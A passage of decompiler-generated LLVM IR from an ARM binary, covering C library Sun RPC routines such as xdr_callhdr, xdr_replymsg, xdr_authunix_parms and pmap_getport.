  uselistorder i32 %v2_33df0, { 1, 0 }
  uselistorder i32 %v0_33d38, { 1, 0 }
  uselistorder i32 %tmp, { 4, 2, 0, 1, 5, 6, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 6, 2, 3, 5, 4, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 28, { 65, 66, 67, 2, 68, 69, 70, 100, 29, 121, 56, 15, 57, 58, 122, 73, 74, 30, 16, 101, 123, 102, 103, 71, 31, 72, 32, 133, 34, 104, 33, 107, 108, 109, 111, 112, 35, 36, 110, 3, 124, 37, 105, 106, 134, 113, 38, 39, 40, 98, 99, 59, 60, 1, 61, 62, 4, 114, 115, 116, 117, 118, 125, 126, 127, 128, 129, 130, 131, 0, 132, 75, 119, 81, 135, 136, 21, 41, 42, 139, 140, 141, 137, 138, 76, 77, 78, 22, 23, 95, 96, 97, 43, 44, 24, 79, 25, 80, 82, 83, 84, 85, 45, 86, 46, 89, 87, 88, 63, 64, 47, 26, 5, 90, 7, 91, 6, 92, 27, 17, 9, 11, 13, 28, 18, 10, 12, 14, 93, 48, 49, 94, 19, 50, 51, 52, 53, 54, 55, 20, 8, 120 }
  uselistorder i32 9, { 25, 35, 36, 37, 10, 38, 40, 11, 42, 0, 43, 44, 12, 13, 26, 39, 49, 41, 24, 21, 22, 23, 45, 46, 47, 48, 14, 2, 1, 15, 16, 17, 18, 19, 20, 7, 4, 3, 8, 6, 5, 27, 28, 29, 30, 31, 32, 9, 33, 34 }
  uselistorder i32 7, { 45, 4, 62, 63, 5, 46, 28, 29, 0, 1, 2, 40, 41, 42, 43, 44, 68, 65, 66, 67, 3, 7, 47, 8, 48, 9, 49, 10, 11, 30, 31, 12, 13, 32, 33, 34, 26, 50, 14, 15, 35, 36, 16, 17, 37, 38, 39, 27, 51, 18, 52, 19, 53, 20, 54, 21, 55, 22, 56, 23, 57, 58, 59, 60, 24, 61, 6, 64, 25 }
  uselistorder i32 24, { 26, 27, 28, 29, 57, 61, 62, 63, 5, 18, 76, 34, 6, 77, 64, 65, 30, 31, 32, 33, 0, 72, 9, 1, 68, 69, 70, 58, 59, 78, 10, 60, 35, 36, 37, 66, 67, 87, 73, 38, 53, 19, 20, 21, 22, 23, 24, 2, 71, 79, 80, 81, 82, 83, 84, 85, 86, 39, 75, 74, 43, 40, 41, 42, 11, 44, 25, 45, 46, 47, 3, 48, 49, 7, 50, 12, 13, 51, 14, 15, 52, 16, 17, 54, 55, 4, 8, 56 }
  uselistorder i32* %arg2, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 %arg1, { 6, 3, 7, 0, 1, 2, 4, 5, 8 }
  uselistorder label %dec_label_pc_33e30, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_33dd4, { 0, 2, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_33e38 = load i32, i32* @r4, align 4
  store i32 %v3_33e38, i32* %stack_var_-12, align 4
  %v6_33e38 = load i32, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_33e40 = add i32 %arg2, 4
  %v3_33e40 = inttoptr i32 %v2_33e40 to i32*
  store i32 0, i32* %v3_33e40, align 4
  %v0_33e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_33e44 = add i32 %v0_33e44, 2
  store i32 %v1_33e44, i32* %r3.global-to-local, align 4
  %v2_33e48 = add i32 %arg2, 8
  %v3_33e48 = inttoptr i32 %v2_33e48 to i32*
  store i32 %v1_33e44, i32* %v3_33e48, align 4
  %v2_33e4c = load i32, i32* %arg1, align 4
  store i32 %v2_33e4c, i32* %r3.global-to-local, align 4
  %v2_33e50 = icmp eq i32 %v2_33e4c, 0
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  br i1 %v2_33e50, label %dec_label_pc_33e64, label %dec_label_pc_33ec0

dec_label_pc_33e64:                               ; preds = %entry
  %v0_33e64 = call i32 @xdr_u_long()
  %v2_33e68 = icmp eq i32 %v0_33e64, 0
  br i1 %v2_33e68, label %dec_label_pc_33ec0, label %dec_label_pc_33e70

dec_label_pc_33e70:                               ; preds = %dec_label_pc_33e64
  %v0_33e70 = load i32, i32* @r4, align 4
  store i32 %v0_33e70, i32* @r0, align 4
  %v0_33e78 = call i32 @xdr_enum()
  %v2_33e7c = icmp eq i32 %v0_33e78, 0
  br i1 %v2_33e7c, label %dec_label_pc_33ec0, label %dec_label_pc_33e84

dec_label_pc_33e84:                               ; preds = %dec_label_pc_33e70
  %v0_33e84 = load i32, i32* @r4, align 4
  store i32 %v0_33e84, i32* @r0, align 4
  %v0_33e88 = load i32, i32* @r5, align 4
  %v1_33e88 = add i32 %v0_33e88, 8
  store i32 %v1_33e88, i32* @r1, align 4
  %v0_33e8c = call i32 @xdr_u_long()
  %v2_33e90 = icmp eq i32 %v0_33e8c, 0
  br i1 %v2_33e90, label %dec_label_pc_33ec0, label %dec_label_pc_33e98

dec_label_pc_33e98:                               ; preds = %dec_label_pc_33e84
  %v0_33e98 = load i32, i32* @r4, align 4
  store i32 %v0_33e98, i32* @r0, align 4
  %v0_33e9c = load i32, i32* @r5, align 4
  %v1_33e9c = add i32 %v0_33e9c, 12
  store i32 %v1_33e9c, i32* @r1, align 4
  %v0_33ea0 = call i32 @xdr_u_long()
  %v2_33ea4 = icmp eq i32 %v0_33ea0, 0
  br i1 %v2_33ea4, label %dec_label_pc_33ec0, label %dec_label_pc_33eac

dec_label_pc_33eac:                               ; preds = %dec_label_pc_33e98
  %v0_33eac = load i32, i32* @r4, align 4
  store i32 %v0_33eac, i32* @r0, align 4
  %v0_33eb0 = load i32, i32* @r5, align 4
  %v1_33eb0 = add i32 %v0_33eb0, 16
  store i32 %v1_33eb0, i32* @r1, align 4
  %v0_33eb4 = call i32 @xdr_u_long()
  br label %dec_label_pc_33ec0

dec_label_pc_33ec0:                               ; preds = %dec_label_pc_33e64, %dec_label_pc_33e70, %dec_label_pc_33e84, %dec_label_pc_33e98, %entry, %dec_label_pc_33eac
  %storemerge = phi i32 [ %v0_33eb4, %dec_label_pc_33eac ], [ 0, %entry ], [ 0, %dec_label_pc_33e98 ], [ 0, %dec_label_pc_33e84 ], [ 0, %dec_label_pc_33e70 ], [ 0, %dec_label_pc_33e64 ]
  %v2_33ec4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_33ec4, i32* @r4, align 4
  store i32 %v6_33e38, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_33ec0, { 5, 3, 2, 1, 0, 4 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_33edc = call i32 @xdr_enum()
  %v2_33ee0 = icmp eq i32 %v0_33edc, 0
  br i1 %v2_33ee0, label %dec_label_pc_33f34, label %dec_label_pc_33ee8

dec_label_pc_33ee8:                               ; preds = %entry
  %v0_33ee8 = load i32, i32* @r4, align 4
  %v1_33ee8 = inttoptr i32 %v0_33ee8 to i32*
  %v2_33ee8 = load i32, i32* %v1_33ee8, align 4
  %v2_33eec = icmp eq i32 %v2_33ee8, 0
  br i1 %v2_33eec, label %dec_label_pc_33f00, label %dec_label_pc_33ef4

dec_label_pc_33ef4:                               ; preds = %dec_label_pc_33ee8
  %v7_33ef4 = icmp eq i32 %v2_33ee8, 1
  br i1 %v7_33ef4, label %dec_label_pc_33f24, label %dec_label_pc_33f34

dec_label_pc_33f00:                               ; preds = %dec_label_pc_33ee8
  %v0_33f00 = load i32, i32* @r5, align 4
  store i32 %v0_33f00, i32* @r0, align 4
  %v1_33f04 = add i32 %v0_33ee8, 4
  store i32 %v1_33f04, i32* @r1, align 4
  %v0_33f08 = call i32 @xdr_u_long()
  %v2_33f0c = icmp eq i32 %v0_33f08, 0
  br i1 %v2_33f0c, label %dec_label_pc_33f34, label %dec_label_pc_33f14

dec_label_pc_33f14:                               ; preds = %dec_label_pc_33f00
  %v0_33f14 = load i32, i32* @r5, align 4
  store i32 %v0_33f14, i32* @r0, align 4
  %v0_33f18 = load i32, i32* @r4, align 4
  %v1_33f18 = add i32 %v0_33f18, 8
  store i32 %v1_33f18, i32* @r1, align 4
  %v0_33f1c = call i32 @xdr_u_long()
  br label %dec_label_pc_33f38

dec_label_pc_33f24:                               ; preds = %dec_label_pc_33ef4
  %v0_33f24 = load i32, i32* @r5, align 4
  store i32 %v0_33f24, i32* @r0, align 4
  %v0_33f2c = call i32 @xdr_enum()
  br label %dec_label_pc_33f38

dec_label_pc_33f34:                               ; preds = %dec_label_pc_33ef4, %dec_label_pc_33f00, %entry
  br label %dec_label_pc_33f38

dec_label_pc_33f38:                               ; preds = %dec_label_pc_33f24, %dec_label_pc_33f14, %dec_label_pc_33f34
  %v1_33f40 = phi i32 [ %v0_33f2c, %dec_label_pc_33f24 ], [ %v0_33f1c, %dec_label_pc_33f14 ], [ 0, %dec_label_pc_33f34 ]
  ret i32 %v1_33f40

; uselistorder directives
  uselistorder label %dec_label_pc_33f38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_33f34, { 1, 0, 2 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_33f44 = load i32, i32* @r4, align 4
  %v6_33f44 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_33f54 = call i32 @xdr_u_long()
  %v2_33f5c = icmp eq i32 %v0_33f54, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r5, align 4
  br i1 %v2_33f5c, label %dec_label_pc_33fb0, label %dec_label_pc_33f68

dec_label_pc_33f68:                               ; preds = %entry
  %v0_33f68 = load i32, i32* @r6, align 4
  store i32 %v0_33f68, i32* @r0, align 4
  %v0_33f70 = call i32 @xdr_enum()
  %v2_33f74 = icmp eq i32 %v0_33f70, 0
  br i1 %v2_33f74, label %dec_label_pc_33fb0, label %dec_label_pc_33f7c

dec_label_pc_33f7c:                               ; preds = %dec_label_pc_33f68
  %v0_33f7c = load i32, i32* @r4, align 4
  %v1_33f7c = add i32 %v0_33f7c, 4
  %v2_33f7c = inttoptr i32 %v1_33f7c to i32*
  %v3_33f7c = load i32, i32* %v2_33f7c, align 4
  %v7_33f80 = icmp eq i32 %v3_33f7c, 1
  br i1 %v7_33f80, label %dec_label_pc_33f88, label %dec_label_pc_33fb0

dec_label_pc_33f88:                               ; preds = %dec_label_pc_33f7c
  %v0_33f90 = load i32, i32* @r5, align 4
  %v2_33f90 = add i32 %v0_33f90, -24
  %v0_33f94 = load i32, i32* @r6, align 4
  %v1_33f98 = add i32 %v0_33f7c, 12
  %v1_33f9c = add i32 %v0_33f7c, 8
  %v5_33fa4 = inttoptr i32 %v1_33f9c to i32*
  %v6_33fa4 = call i32 @xdr_union(i32 %v0_33f94, i32* %v5_33fa4, i32 %v1_33f98, i32 %v2_33f90, i32 0)
  br label %dec_label_pc_33fb0

dec_label_pc_33fb0:                               ; preds = %entry, %dec_label_pc_33f68, %dec_label_pc_33f7c, %dec_label_pc_33f88
  %storemerge = phi i32 [ %v6_33fa4, %dec_label_pc_33f88 ], [ 0, %dec_label_pc_33f7c ], [ 0, %dec_label_pc_33f68 ], [ 0, %entry ]
  store i32 %v3_33f44, i32* @r4, align 4
  store i32 %v6_33f44, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_33f7c, { 1, 0, 2 }
  uselistorder i32 -24, { 5, 2, 6, 7, 4, 3, 0, 1, 8 }
  uselistorder label %dec_label_pc_33fb0, { 3, 2, 1, 0 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  %v0_33fd0 = load i32, i32* @r0, align 4
  %v1_33fd0 = load i32, i32* @r1, align 4
  %v3_33fd0 = inttoptr i32 %v0_33fd0 to i32*
  %v4_33fd0 = call i32 @xdr_opaque(i32* %v3_33fd0, i32 %v1_33fd0, i32 8)
  ret i32 %v4_33fd0

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @xdr_opaque, { 1, 0, 2 }
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v0_33fe8 = load i32, i32* @r0, align 4
  store i32 %v0_33fe8, i32* %r5.global-to-local, align 4
  %v0_33ff0 = call i32 @xdr_enum()
  store i32 %v0_33ff0, i32* %r0.global-to-local, align 4
  %v2_33ff4 = icmp eq i32 %v0_33ff0, 0
  br i1 %v2_33ff4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v1_33ff8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_33ff8, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v1_34008 = xor i1 %v2_33ff4, true
  call void @__pseudo_cond_branch(i1 %v1_34008, i32 ptrtoint (i32* @global_var_31c44.2218 to i32))
  %v1_34014 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_34014

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_34028 = call i32 @xdr_opaque_auth()
  %v2_3402c = icmp eq i32 %v0_34028, 0
  br i1 %v2_3402c, label %dec_label_pc_340a0, label %dec_label_pc_34034

dec_label_pc_34034:                               ; preds = %entry
  %v0_34034 = load i32, i32* @r5, align 4
  store i32 %v0_34034, i32* @r0, align 4
  %v0_3403c = call i32 @xdr_enum()
  %v2_34040 = icmp eq i32 %v0_3403c, 0
  br i1 %v2_34040, label %dec_label_pc_340a0, label %dec_label_pc_34048

dec_label_pc_34048:                               ; preds = %dec_label_pc_34034
  %v0_34048 = load i32, i32* @r4, align 4
  %v1_34048 = add i32 %v0_34048, 12
  %v2_34048 = inttoptr i32 %v1_34048 to i32*
  %v3_34048 = load i32, i32* %v2_34048, align 4
  %v2_3404c = icmp eq i32 %v3_34048, 0
  br i1 %v2_3404c, label %dec_label_pc_34064, label %dec_label_pc_34054

dec_label_pc_34054:                               ; preds = %dec_label_pc_34048
  %v7_34054 = icmp eq i32 %v3_34048, 2
  br i1 %v7_34054, label %dec_label_pc_3407c, label %bb

bb:                                               ; preds = %dec_label_pc_34054
  br label %dec_label_pc_340a4

dec_label_pc_34064:                               ; preds = %dec_label_pc_34048
  %v0_34064 = load i32, i32* @r5, align 4
  %v1_3406c = add i32 %v0_34048, 20
  %v2_3406c = inttoptr i32 %v1_3406c to i32*
  %v3_3406c = load i32, i32* %v2_3406c, align 4
  call void @__pseudo_branch(i32 %v3_3406c)
  br label %dec_label_pc_340a4

dec_label_pc_3407c:                               ; preds = %dec_label_pc_34054
  %v0_3407c = load i32, i32* @r5, align 4
  store i32 %v0_3407c, i32* @r0, align 4
  %v1_34080 = add i32 %v0_34048, 16
  store i32 %v1_34080, i32* @r1, align 4
  %v0_34084 = call i32 @xdr_u_long()
  %v2_34088 = icmp eq i32 %v0_34084, 0
  br i1 %v2_34088, label %dec_label_pc_340a0, label %dec_label_pc_34090

dec_label_pc_34090:                               ; preds = %dec_label_pc_3407c
  %v0_34090 = load i32, i32* @r5, align 4
  store i32 %v0_34090, i32* @r0, align 4
  %v0_34094 = load i32, i32* @r4, align 4
  %v1_34094 = add i32 %v0_34094, 20
  store i32 %v1_34094, i32* @r1, align 4
  %v0_34098 = call i32 @xdr_u_long()
  br label %dec_label_pc_340a4

dec_label_pc_340a0:                               ; preds = %dec_label_pc_3407c, %dec_label_pc_34034, %entry
  br label %dec_label_pc_340a4

dec_label_pc_340a4:                               ; preds = %bb, %dec_label_pc_34090, %dec_label_pc_34064, %dec_label_pc_340a0
  %v1_340ac = phi i32 [ 1, %bb ], [ %v0_34098, %dec_label_pc_34090 ], [ %v0_34064, %dec_label_pc_34064 ], [ 0, %dec_label_pc_340a0 ]
  ret i32 %v1_340ac

; uselistorder directives
  uselistorder i32 %v0_34048, { 1, 0, 2 }
  uselistorder i32 ()* @xdr_enum, { 6, 1, 5, 4, 3, 0, 2 }
  uselistorder i32 ()* @xdr_opaque_auth, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_340a4, { 3, 1, 2, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_340b0 = load i32, i32* @r4, align 4
  %v6_340b0 = load i32, i32* @r5, align 4
  %v9_340b0 = load i32, i32* @r6, align 4
  %v15_340b0 = load i32, i32* @r8, align 4
  %v18_340b0 = load i32, i32* @sb, align 4
  %v21_340b0 = load i32, i32* @sl, align 4
  %v24_340b0 = load i32, i32* @fp, align 4
  %v27_340b0 = load i32, i32* @lr, align 4
  store i32 -33016, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33016), i32* %ip.global-to-local, align 4
  %v3_340c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -33012) to i32*), align 4
  store i32 %v3_340c8, i32* @r4, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 %arg2, i32* @r8, align 4
  %v3_340e0 = add i32 %arg1, 2
  %v4_340e0 = inttoptr i32 %v3_340e0 to i16*
  store i16 28416, i16* %v4_340e0, align 2
  store i32 %arg4, i32* @sb, align 4
  %v0_340e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_340e8, i32* %stack_var_-48, align 4
  %v0_340ec = load i32, i32* @r6, align 4
  %v1_340ec = load i32, i32* %lr.global-to-local, align 4
  %v2_340ec = add i32 %v1_340ec, %v0_340ec
  %v3_340ec = inttoptr i32 %v2_340ec to i32*
  %v4_340ec = load i32, i32* %v3_340ec, align 4
  store i32 %v4_340ec, i32* @r3, align 4
  %v2_340f0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_340f0, i32* %ip.global-to-local, align 4
  store i32 400, i32* @lr, align 4
  store i32 0, i32* @fp, align 4
  store i32 100000, i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 400, i32* %stack_var_-80, align 4
  %v0_34118 = call i32 @__GI_clntudp_bufcreate()
  store i32 %v0_34118, i32* @r5, align 4
  %v2_3411c = icmp eq i32 %v0_34118, 0
  br i1 %v2_3411c, label %dec_label_pc_341d8, label %dec_label_pc_34124

dec_label_pc_34124:                               ; preds = %entry
  %v0_34124 = call i32 @__GI___rpc_thread_createerr()
  %v0_3412c = load i32, i32* @r6, align 4
  %v2_3412c = add i32 %v0_3412c, -33008
  store i32 %v0_34124, i32* %r7.global-to-local, align 4
  %v1_34134 = inttoptr i32 %v2_3412c to i32*
  %v2_34134 = load i32, i32* %v1_34134, align 4
  %v0_34154 = load i32, i32* @r5, align 4
  %v1_34154 = add i32 %v0_34154, 4
  %v2_34154 = inttoptr i32 %v1_34154 to i32*
  %v3_34154 = load i32, i32* %v2_34154, align 4
  %v2_34158 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_34158, i32* %ip.global-to-local, align 4
  store i32 %v2_34134, i32* %stack_var_-80, align 4
  %v1_3417c = inttoptr i32 %v3_34154 to i32*
  %v2_3417c = load i32, i32* %v1_3417c, align 4
  store i32 %v2_3417c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_34188.2226 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_3417c)
  %v1_34188 = load i32, i32* @fp, align 4
  %v9_34188 = icmp eq i32 %v0_34154, %v1_34188
  br i1 %v9_34188, label %dec_label_pc_341b4, label %dec_label_pc_34190

dec_label_pc_34190:                               ; preds = %dec_label_pc_34124
  %v1_34194 = load i32, i32* %r7.global-to-local, align 4
  %v2_34194 = inttoptr i32 %v1_34194 to i32*
  store i32 14, i32* %v2_34194, align 4
  %v3_34194 = load i32, i32* %r7.global-to-local, align 4
  %v4_34194 = add i32 %v3_34194, 4
  store i32 %v4_34194, i32* %r7.global-to-local, align 4
  %v0_34198 = load i32, i32* @r5, align 4
  %v1_341a0 = add i32 %v0_34198, 4
  %v2_341a0 = inttoptr i32 %v1_341a0 to i32*
  %v3_341a0 = load i32, i32* %v2_341a0, align 4
  %v1_341a4 = add i32 %v3_341a0, 8
  %v2_341a4 = inttoptr i32 %v1_341a4 to i32*
  %v3_341a4 = load i32, i32* %v2_341a4, align 4
  store i32 %v3_341a4, i32* %ip.global-to-local, align 4
  store i32 213424, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_341a4)
  br label %.thread

dec_label_pc_341b4:                               ; preds = %dec_label_pc_34124
  %v2_341c0 = load i32, i32* %r7.global-to-local, align 4
  %v3_341c0 = inttoptr i32 %v2_341c0 to i32*
  store i32 15, i32* %v3_341c0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_34190, %dec_label_pc_341b4
  %v0_341c4 = load i32, i32* @r5, align 4
  %v1_341c8 = add i32 %v0_341c4, 4
  %v2_341c8 = inttoptr i32 %v1_341c8 to i32*
  %v3_341c8 = load i32, i32* %v2_341c8, align 4
  %v1_341cc = add i32 %v3_341c8, 16
  %v2_341cc = inttoptr i32 %v1_341cc to i32*
  %v3_341cc = load i32, i32* %v2_341cc, align 4
  store i32 %v3_341cc, i32* %ip.global-to-local, align 4
  store i32 213464, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_341cc)
  br label %dec_label_pc_341d8

dec_label_pc_341d8:                               ; preds = %entry, %.thread
  store i16 0, i16* %v4_340e0, align 2
  store i32 %v3_340b0, i32* @r4, align 4
  store i32 %v6_340b0, i32* @r5, align 4
  store i32 %v9_340b0, i32* @r6, align 4
  store i32 %v15_340b0, i32* @r8, align 4
  store i32 %v18_340b0, i32* @sb, align 4
  store i32 %v21_340b0, i32* @sl, align 4
  store i32 %v24_340b0, i32* @fp, align 4
  store i32 %v27_340b0, i32* %lr.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 2, 4, 1, 0, 3 }
  uselistorder i32 ()* @__GI_clntudp_bufcreate, { 1, 3, 2, 0 }
  uselistorder i32 400, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_341d8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_3420c = load i32, i32* @r4, align 4
  %v6_3420c = load i32, i32* @r5, align 4
  %v9_3420c = load i32, i32* @r6, align 4
  %v12_3420c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_3421c = call i32 @xdr_u_long()
  %v2_34224 = icmp eq i32 %v0_3421c, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_34224, label %dec_label_pc_342a0, label %dec_label_pc_34230

dec_label_pc_34230:                               ; preds = %entry
  %v0_34230 = load i32, i32* @r5, align 4
  %v0_34234 = load i32, i32* @r4, align 4
  %v1_34234 = add i32 %v0_34234, 4
  %v3_3423c = inttoptr i32 %v0_34230 to i32*
  %v4_3423c = call i32 @__GI_xdr_string(i32* %v3_3423c, i32 %v1_34234, i32 255)
  %v2_34240 = icmp eq i32 %v4_3423c, 0
  br i1 %v2_34240, label %dec_label_pc_342a0, label %dec_label_pc_34248

dec_label_pc_34248:                               ; preds = %dec_label_pc_34230
  %v0_34248 = load i32, i32* @r5, align 4
  store i32 %v0_34248, i32* @r0, align 4
  %v0_3424c = load i32, i32* @r4, align 4
  %v1_3424c = add i32 %v0_3424c, 8
  store i32 %v1_3424c, i32* @r1, align 4
  %v2_34250 = inttoptr i32 %v0_34248 to i32*
  %v3_34250 = inttoptr i32 %v1_3424c to i32*
  %v4_34250 = call i32 @xdr_u_int(i32* %v2_34250, i32* %v3_34250)
  %v2_34254 = icmp eq i32 %v4_34250, 0
  br i1 %v2_34254, label %dec_label_pc_342a0, label %dec_label_pc_3425c

dec_label_pc_3425c:                               ; preds = %dec_label_pc_34248
  %v0_3425c = load i32, i32* @r5, align 4
  store i32 %v0_3425c, i32* @r0, align 4
  %v0_34260 = load i32, i32* @r4, align 4
  %v1_34260 = add i32 %v0_34260, 12
  store i32 %v1_34260, i32* @r1, align 4
  %v2_34264 = inttoptr i32 %v0_3425c to i32*
  %v3_34264 = inttoptr i32 %v1_34260 to i32*
  %v4_34264 = call i32 @xdr_u_int(i32* %v2_34264, i32* %v3_34264)
  %v2_34268 = icmp eq i32 %v4_34264, 0
  br i1 %v2_34268, label %dec_label_pc_342a0, label %dec_label_pc_34270

dec_label_pc_34270:                               ; preds = %dec_label_pc_3425c
  %v0_34278 = load i32, i32* @r6, align 4
  %v2_34278 = add i32 %v0_34278, -78744
  store i32 %v2_34278, i32* @lr, align 4
  %v0_3427c = load i32, i32* @r5, align 4
  %v0_34280 = load i32, i32* @r4, align 4
  %v1_34280 = add i32 %v0_34280, 16
  %v1_34284 = add i32 %v0_34280, 20
  %v6_34290 = inttoptr i32 %v0_3427c to i32*
  %v7_34290 = call i32 @__GI_xdr_array(i32* %v6_34290, i32 %v1_34284, i32 %v1_34280, i32 16, i32 4, i32 %v2_34278)
  %v2_34294 = icmp eq i32 %v7_34290, 0
  br i1 %v2_34294, label %dec_label_pc_342a4, label %bb

bb:                                               ; preds = %dec_label_pc_34270
  br label %dec_label_pc_342a4

dec_label_pc_342a0:                               ; preds = %dec_label_pc_3425c, %dec_label_pc_34248, %dec_label_pc_34230, %entry
  br label %dec_label_pc_342a4

dec_label_pc_342a4:                               ; preds = %bb, %dec_label_pc_34270, %dec_label_pc_342a0
  %v1_342ac = phi i32 [ 1, %bb ], [ 0, %dec_label_pc_34270 ], [ 0, %dec_label_pc_342a0 ]
  store i32 %v3_3420c, i32* @r4, align 4
  store i32 %v6_3420c, i32* @r5, align 4
  store i32 %v9_3420c, i32* @r6, align 4
  store i32 %v12_3420c, i32* @lr, align 4
  ret i32 %v1_342ac

; uselistorder directives
  uselistorder i32 ()* @xdr_u_long, { 8, 13, 12, 11, 10, 9, 3, 2, 1, 0, 7, 6, 5, 4, 14 }
  uselistorder label %dec_label_pc_342a4, { 2, 0, 1 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_342ec

dec_label_pc_342dc:                               ; preds = %dec_label_pc_342ec
  call void @__pseudo_branch(i32 %arg5)
  %v0_342e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_342e4 = icmp eq i32 %v0_342e4, 0
  br i1 %v2_342e4, label %dec_label_pc_3430c, label %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge

dec_label_pc_342dc.dec_label_pc_342ec_crit_edge:  ; preds = %dec_label_pc_342dc
  %v0_342ec.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_342ec.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_342f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_342f4.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_342fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_342ec

dec_label_pc_342ec:                               ; preds = %dec_label_pc_342dc.dec_label_pc_342ec_crit_edge, %entry
